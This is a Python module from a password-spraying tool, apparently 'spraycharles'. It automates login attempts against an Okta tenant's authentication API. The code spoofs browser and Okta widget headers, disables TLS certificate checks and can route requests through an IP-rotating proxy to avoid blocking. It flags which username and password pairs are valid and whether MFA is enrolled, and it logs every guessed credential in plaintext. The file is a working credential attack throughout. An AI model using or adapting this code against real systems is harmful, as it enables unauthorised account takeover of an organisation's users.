import json
import requests
import datetime

from spraycharles.lib.utils import SprayResult
from spraycharles.lib.logger import logger, JSON_FMT

class Okta:
    NAME = "Okta"
    DESCRIPTION = "Spray Okta API"


    def __init__(self, host, port, timeout, fireprox):
        self.timeout = timeout
        self.url = f"https://{host}:{port}/api/v1/authn"

        # Okta requires username posted to /api/v1/authn to get a stateToken, and then this
        # token and password get posted to /api/v1/authn/factors/password/verify
        self.url2 = f"https://{host}:{port}/api/v1/authn/factors/password/verify"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox/api/v1/authn"
            self.url2 = (
                f"https://{fireprox}/fireprox/api/v1/authn/factors/password/verify"
            )

        self.headers = {
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "X-Okta-User-Agent-Extended": "okta-signin-widget-2.12.0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en",
            "Content-Type": "application/json",
        }

        # username submission json
        self.data = {
            "username": "",
            "options": {
                "warnBeforePasswordExpired": "true",
                "multiOptionalFactorEnroll": "true",
            },
        }

        # password submission json
        self.data2 = {"password": "", "stateToken": ""}


    def set_username(self, username):
        self.data["username"] = username


    def set_password(self, password):
        self.data2["password"] = password


    def set_token(self, token):
        self.data2["stateToken"] = token


    def login(self, username, password):
        # set data
        self.set_username(username)
        # post the request
        response = requests.post(
            self.url,
            headers=self.headers,
            json=self.data,
            timeout=self.timeout,
            verify=False,
        )  # , proxies=self.proxyDict)

        # get the stateToken for password submission
        data = response.json()
        token = ""
        if "stateToken" in data.keys():
            token = data["stateToken"]
        else:
            # temp debug
            # print("[DEBUG] stateToken missing from Okta response;")
            # raise ValueError(f"Okta response missing stateToken")
            return response

        self.set_password(password)
        self.set_token(token)
        # post the request
        response = requests.post(
            self.url2,
            headers=self.headers,
            json=self.data2,
            timeout=self.timeout,
            verify=False,
        )  # , proxies=self.proxyDict)

        return response


    #
    # Print table headers
    #
    def print_headers(self):
        header = (
            "%-13s %-30s %-35s %-25s %-13s %-15s"
            % (
                SprayResult.RESULT,
                SprayResult.MESSAGE,
                SprayResult.USERNAME,
                SprayResult.PASSWORD,
                SprayResult.RESPONSE_CODE,
                SprayResult.RESPONSE_LENGTH,
            )
        )
        print(header)
        print("-" * len(header))


    #
    # Print individual login attempt result
    #
    def print_response(self, response, outfile, timeout=False, print_to_screen=True):
        if timeout:
            code = "TIMEOUT"
            length = "TIMEOUT"
        else:
            code = response.status_code
            length = str(len(response.content))

        data = response.json()

        result = None

        if "errorSummary" in data.keys():
            if data["errorSummary"] == "Authentication failed":
                # Login returned early - stateToken missing
                result = "Error"
                message = "Okta resp missing stateToken"
            else:
                # standard fail
                result = "Fail"
                message = data["errorSummary"]

        # statuses taken from https://developer.okta.com/docs/reference/api/authn/#response-example-for-primary-authentication-with-public-application-success
        elif response.status_code == 200 and "status" in data.keys():
            # print(f"[DEBUG]: {data}")
            # Account lockout
            if data["status"] == "LOCKED_OUT":
                result = "Fail"
                message = "Account appears locked"

            # Valid and not enrolled in MFA yet
            elif data["status"] == "PASSWORD_EXPIRED":
                result = "Success"
                message = "Password Expired; no MFA"

            # Valid and not enrolled in MFA yet
            elif data["status"] == "MFA_ENROLL":
                result = "Success"
                message = "Valid login; needs MFA enrollment"

            # Valid and MFA required
            elif data["status"] == "MFA_REQUIRED":
                result = "Success"
                message = "Valid login; MFA required"

        # failsafe for all other cases
        else:
            result = "Fail"
            message = "Unknown result returned"

        if print_to_screen:
            print(
                "%-13s %-30s %-35s %-25s %13s %15s"
                % (
                    result,
                    message,
                    self.data["username"],
                    self.data2["password"],
                    code,
                    length,
                )
            )

        self.log_attempt(result, message, code, length, outfile)

        if response.status_code == 429:
            logger.error("Encountered HTTP response code 429; killing spray")
            exit()


    #
    # Log attempt as JSON object to file
    #
    def log_attempt(self, result, message, code, length, outfile):
        output = open(outfile, "a")
        data = json.dumps(
            {
                SprayResult.TIMESTAMP       : datetime.datetime.now(datetime.UTC).strftime("%Y-%m-%d %H:%M:%S"),
                SprayResult.MODULE          : self.__class__.__name__,
                SprayResult.RESULT          : result,
                SprayResult.MESSAGE         : message,
                SprayResult.USERNAME        : self.data["username"],
                SprayResult.PASSWORD        : self.data2["password"],
                SprayResult.RESPONSE_CODE   : code,
                SprayResult.RESPONSE_LENGTH : length,
            }
        )
        logger.debug(data, extra=JSON_FMT)
        output.write(data)
        output.write("\n")
        output.close()